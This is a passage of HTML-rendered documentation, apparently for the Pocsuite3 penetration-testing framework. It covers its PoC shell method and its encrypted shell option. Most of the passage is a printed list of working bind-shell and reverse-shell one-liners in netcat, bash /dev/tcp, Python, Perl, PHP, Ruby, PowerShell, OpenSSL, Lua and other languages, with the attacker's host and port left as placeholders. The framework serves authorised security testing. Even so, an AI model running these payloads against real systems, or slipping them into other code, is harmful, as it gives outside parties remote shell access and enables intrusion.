<span class="line"><span style="color:#A6ACCD;">    cmd </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">get_option</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">cmd</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    res </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">_exploit</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">cmd</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{}</span></span>
<span class="line"><span style="color:#A6ACCD;">    result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">][</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">URL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">url</span></span>
<span class="line"><span style="color:#A6ACCD;">    result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">][</span><span style="color:#A6ACCD;">cmd</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> res</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">parse_output</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">result</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_shell</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">bind_shell</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">,</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">_exploit</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span></code></pre></div><p>From version <em><strong>1.8.6</strong></em>, Pocsuite3 supports encrypted shell. Use the openssl reverse shell payload in the PoC, and specify the <code>--tls</code> option at the runtime.</p><p><img src="`+a+'" alt=""></p><p>As you see, the traffic is encrypted:</p><p><img src="'+l+`" alt=""></p><p>List of Pocsuite3 Payloads:</p><div class="language-python"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">In </span><span style="color:#89DDFF;">[</span><span style="color:#F78C6C;">1</span><span style="color:#89DDFF;">]:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">from</span><span style="color:#A6ACCD;"> pocsuite3</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">api </span><span style="color:#89DDFF;font-style:italic;">import</span><span style="color:#A6ACCD;"> BIND_PAYLOAD</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> REVERSE_PAYLOAD</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">In </span><span style="color:#89DDFF;">[</span><span style="color:#F78C6C;">2</span><span style="color:#89DDFF;">]:</span><span style="color:#A6ACCD;"> BIND_PAYLOAD</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">__dict__</span></span>
<span class="line"><span style="color:#A6ACCD;">Out</span><span style="color:#89DDFF;">[</span><span style="color:#F78C6C;">2</span><span style="color:#89DDFF;">]:</span></span>
<span class="line"><span style="color:#82AAFF;">mappingproxy</span><span style="color:#89DDFF;">({</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__module__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">pocsuite3.modules.listener.bind_tcp</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">NODE</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">node -e </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">sh=child_process.spawn(&quot;/bin/sh&quot;);net.createServer(function(client){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}}).listen(&quot;{0}&quot;)</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">NC</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">nc -l -p {0} -e /bin/sh</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">SOCAT</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">socat TCP-LISTEN:{0},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">PYTHON</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">python -c </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&quot;0.0.0.0&quot;,{0}));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">PERL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">perl -e </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">use Socket;$p={0};socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,&quot;&gt;&amp;C&quot;);open(STDOUT,&quot;&gt;&amp;C&quot;);open(STDERR,&quot;&gt;&amp;C&quot;);exec(&quot;/bin/bash -i&quot;);}};</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">PHP</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">php -r </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&quot;0.0.0.0&quot;,{0});socket_listen($s,1);$cl=socket_accept($s);while(1){{if(!socket_write($cl,&quot;$ &quot;,2))exit;$in=socket_read($cl,100);$cmd=popen(&quot;$in&quot;,&quot;r&quot;);while(!feof($cmd)){{$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}}}</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">RUBY</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">ruby -rsocket -e </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">exit if fork;s=TCPServer.new(&quot;{0}&quot;);while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){{|io|c.print io.read}}end;end</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">NC2</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc -lvp {0} &gt;/tmp/f</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">AWK</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">awk </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">BEGIN{{s=&quot;/inet/tcp/{0}/0/0&quot;;do{{if((s|&amp;getline c)&lt;=0)break;if(c){{while((c|&amp;getline)&gt;0)print $0|&amp;s;close(c)}}}} while(c!=&quot;exit&quot;)close(s)}}</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">TELNETD</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">telnetd -l /bin/sh -p {0}</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">NC3</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">rm -rf /tmp/f;mkfifo /tmp/f||mknod /tmp/f p;(nc -l -p {0}||nc -l {0})0&lt;/tmp/f|/bin/sh&gt;/tmp/f 2&gt;&amp;1;rm /tmp/f</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">R</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">R -e &quot;s&lt;-socketConnection(port={0},blocking=TRUE,server=TRUE,open=</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">r+</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">);while(TRUE){{writeLines(readLines(pipe(readLines(s,1))),s)}}&quot;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__dict__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&lt;</span><span style="color:#82AAFF;">attribute </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__dict__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#82AAFF;"> of </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">BIND_PAYLOAD</span><span style="color:#89DDFF;">&#39;</span><span style="color:#82AAFF;"> objects</span><span style="color:#89DDFF;">&gt;,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__weakref__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&lt;</span><span style="color:#82AAFF;">attribute </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__weakref__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#82AAFF;"> of </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">BIND_PAYLOAD</span><span style="color:#89DDFF;">&#39;</span><span style="color:#82AAFF;"> objects</span><span style="color:#89DDFF;">&gt;,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__doc__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">None})</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">In </span><span style="color:#89DDFF;">[</span><span style="color:#F78C6C;">3</span><span style="color:#89DDFF;">]:</span><span style="color:#A6ACCD;"> REVERSE_PAYLOAD</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">__dict__</span></span>
<span class="line"><span style="color:#A6ACCD;">Out</span><span style="color:#89DDFF;">[</span><span style="color:#F78C6C;">3</span><span style="color:#89DDFF;">]:</span></span>
<span class="line"><span style="color:#82AAFF;">mappingproxy</span><span style="color:#89DDFF;">({</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__module__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">pocsuite3.modules.listener.reverse_tcp</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">NC</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc {0} {1} &gt;/tmp/f</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">NC2</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">nc -e /bin/sh {0} {1}</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">NC3</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">rm -f /tmp/p;mknod /tmp/p p &amp;&amp; nc {0} {1} 0/tmp/p</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">BASH0</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">sh -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">BASH</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">bash -c &#39;sh -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1&#39;</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">BASH2</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">bash -c &#39;sh -i &amp;gt;&amp;amp; /dev/tcp/{0}/{1} 0&amp;gt;&amp;amp;1&#39;</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">TELNET</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">rm -rf /tmp/p;mkfifo /tmp/p||mknod /tmp/p p;telnet {0} {1} 0&lt;/tmp/p|/bin/sh 1&gt;/tmp/p</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">PERL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">perl -e </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">use Socket;$i=&quot;{0}&quot;;$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);}};</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">PYTHON</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">python -c </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;{0}&quot;,{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">PHP</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">php -r </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">$sock=fsockopen(&quot;{0}&quot;,{1});exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">RUBY</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">ruby -rsocket -e </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">exit if fork;c=TCPSocket.new(&quot;{0}&quot;,&quot;{1}&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){{|io|c.print io.read}}end</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">JAVA</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">r = Runtime.getRuntime()</span><span style="color:#A6ACCD;">\\n</span><span style="color:#C3E88D;">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/{0}/{1};cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><span style="color:#A6ACCD;">\\n</span><span style="color:#C3E88D;">p.waitFor()</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">POWERSHELL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">$client = New-Object System.Net.Sockets.TCPClient(&#39;{0}&#39;,{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([textencoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">OPENSSL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">rm -rf /tmp/s;mkfifo /tmp/s||mknod /tmp/s p;/bin/sh -i &lt;/tmp/s 2&gt;&amp;1|openssl s_client -quiet -connect {0}:{1}&gt;/tmp/s;rm -rf /tmp/s</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">PHP_SSL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">php -r </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">$ctxt=stream_context_create([&quot;ssl&quot;=&gt;[&quot;verify_peer&quot;=&gt;false,&quot;verify_peer_name&quot;=&gt;false]]);while($s=@stream_socket_client(&quot;ssl://{0}:{1}&quot;,$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){{while($l=fgets($s)){{exec($l,$o);$o=implode(&quot;</span><span style="color:#A6ACCD;">\\n</span><span style="color:#C3E88D;">&quot;,$o);$o.=&quot;</span><span style="color:#A6ACCD;">\\n</span><span style="color:#C3E88D;">&quot;;fputs($s,$o);}}}}</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">&amp;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">NC4</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">nc {0} {1} -e /bin/sh</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">BASH3</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">bash -c &#39;0&lt;&amp;173-;exec 173&lt;&gt;/dev/tcp/{0}/{1};sh &lt;&amp;173 &gt;&amp;173 2&gt;&amp;173&#39;</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">TELNET2</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet {0} {1} 0/tmp/p</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">NC5</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">rm -rf /tmp/p;mkfifo /tmp/p||mknod /tmp/p p;nc {0} {1} 0&lt;/tmp/p|/bin/sh 1&gt;/tmp/p</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">LUA</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">lua -e &quot;local s=require(</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">socket</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">);local t=assert(s.tcp());t:connect(</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">{0}</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">,{1});while true do local r,x=t:receive();local f=assert(io.popen(r,</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">r</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">));local b=assert(f:read(</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">*a</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">));t:send(b);end;f:close();t:close();&quot;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">PERL_SSL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">perl -e </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL-&gt;new(PeerAddr=&gt;&quot;{0}:{1}&quot;,SSL_verify_mode=&gt;0);while(sysread($c,$i,8192)){{syswrite($c,\`$i\`);}}</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
